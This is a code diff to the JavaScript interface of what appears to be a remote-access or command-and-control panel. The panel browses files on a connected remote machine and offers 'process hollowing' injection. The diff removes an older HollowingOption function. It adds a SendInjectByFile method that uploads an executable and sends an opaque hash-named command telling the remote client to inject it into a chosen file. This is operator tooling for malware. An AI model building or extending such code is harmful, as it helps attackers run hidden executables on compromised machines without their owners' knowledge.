@@ -335,6 +335,8 @@ function SendInjectByPid(pid,icon,id){
     });
 }
 
+
+
 function displayResult(condition) {
     let existingDiv = document.getElementById('result');
     if (existingDiv) existingDiv.remove();
@@ -379,92 +381,6 @@ function toggleAll(exclude){
 
 // File Exp Process hollowing
 
-
-export function HollowingOption(e, id, path="default"){
-  e.preventDefault();
-  toggleAll("");
-  fetch('/processhollowing')
-    .then(response => response.text())
-    .then(html => {
-      const modal = document.createElement('div');
-      modal.innerHTML = html;
-      modal.style = "position: absolute;left: 5%;width: 90%;top: 0%;z-index: 2;color: white;"
-      modal.id = "ProcessMainTable"
-      document.body.appendChild(modal);
-
-     FetchFilesHollowing(id,path)
-      .then(data =>{
-        let folderselection = document.querySelector('#folderhollowexpSelection');
-        for(let i of data['Folders']['DirectoriesArr']){
-            let option = document.createElement('option');
-            option.text = i;
-            option.value = i;
-            folderselection.add(option);
-        }
-        folderselection.addEventListener('change', (e) => {
-          HollowingOption(e, id, e.target.value);
-        });
-
-        let tbody = document.querySelector('#ProcessesToinject tbody');
-        if (tbody) {
-          while (tbody.firstChild) {
-            tbody.removeChild(tbody.firstChild);
-          }
-        } 
-        for(let i of data['Files']){  
-          let row = document.createElement('tr');
-
-          let tdName = document.createElement('td');
-          tdName.className = "FilesNameInjectoption";
-
-          let img = document.createElement('img');
-          img.src = 'data:image/png;base64,' + i.icon;
-          img.style = "width: 30px; height: 30px;"; 
-          tdName.appendChild(img);
-
-          let pname = document.createElement('p');
-          let nameText = document.createTextNode(i.name);
-          pname.appendChild(nameText);
-
-          tdName.appendChild(pname);
-
-          row.appendChild(tdName);
-
-          let tdSize = document.createElement('td');
-          tdSize.className = "PidInjectoption";
-          tdSize.textContent = i.size;
-          row.appendChild(tdSize);
-
-          let tdLastTimeUpdate = document.createElement('td');
-          tdLastTimeUpdate.className = "Memoryusegoption";
-          tdLastTimeUpdate.textContent = i.lastTimeUpdate;
-          row.appendChild(tdLastTimeUpdate);
-
-          let tdCreationTime = document.createElement('td');
-          tdCreationTime.className = "OwnerInjectoption";
-          tdCreationTime.textContent = i.creationTime;
-          row.appendChild(tdCreationTime);
-
-          let td = document.createElement('td');
-          td.className = "WasInjectoption";
-          let icon = document.createElement('i');
-          icon.className = "fa-solid fa-microchip";
-          td.appendChild(icon);        
-          icon.addEventListener('click', function() {
-            SendInjectByPid(i[1],icon, id);
-          });
-
-          row.appendChild(td);
-          tbody.appendChild(row);
-        }
-      });
-    })
-    .catch(error => console.error('Error:', error));
-}
-
-
-
-
 export class HollowingOptionHandler {
   constructor(id, initialPath = "default") {
       this.id = id;
@@ -472,6 +388,7 @@ export class HollowingOptionHandler {
       this.modal = null;
       this.folderSelection = null;
       this.tbody = null;
+      this.MainPath = null
   }
 
   initialize() {
@@ -495,7 +412,7 @@ export class HollowingOptionHandler {
       this.folderDataList = document.querySelector('#folderhollowexpSelection');
       this.tbody = document.querySelector('#ProcessesToinject tbody');
       this.folderSelection.addEventListener('change', (e) => {
-        if(e.target.value.length > 5){
+        if(e.target.value.length >= 2){
           this.path = e.target.value;
           this.updateContentForPath(this.path);
         }
@@ -511,10 +428,12 @@ export class HollowingOptionHandler {
   handleData(data) {
       this.populateFolderSelection(data['Folders']['DirectoriesArr']);
       this.populateTable(data['Files']);
+      this.MainPath = data['MainPath'];
+      this.folderSelection.placeholder = this.MainPath;
   }
 
   populateFolderSelection(directories) {
-    this.folderDataList.innerHTML = "";  // Clear existing options.
+    this.folderDataList.innerHTML = ""; 
     for(let i of directories){
         let option = document.createElement('option');
         option.value = i;
@@ -531,7 +450,6 @@ export class HollowingOptionHandler {
           let row = this.createRow(i);
           this.tbody.appendChild(row);
       }
-      this.folderSelection.placeholder = this.path;
   }
 
   createRow(file) {
@@ -573,7 +491,7 @@ export class HollowingOptionHandler {
     icon.className = "fa-solid fa-microchip";
     td.appendChild(icon);
     icon.addEventListener('click', function() {
-        SendInjectByPid(file[1], icon, this.id);
+      this.SendInjectByFile(file.name, icon, this.id);
     }.bind(this));
 
     row.appendChild(td);
@@ -581,4 +499,26 @@ export class HollowingOptionHandler {
     return row;
   }
 
+  SendInjectByFile(file, icon, id){
+    UploadProcessToInject().then( exeonbase => {
+        return fetch("/send_message", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({message:{command: "b11c081208b1d6466c83e37098510d73", exeonbase:exeonbase, file:file, path:this.MainPath}, id: id})
+        })
+        .then(response => {
+          return response.json();
+        })
+        .then(res => {
+        if(res.message){
+            icon.style.color = '#0f0';
+        }
+        else{
+            icon.style.color = 'red';
+        }
+        })
+    });
+  }
 }
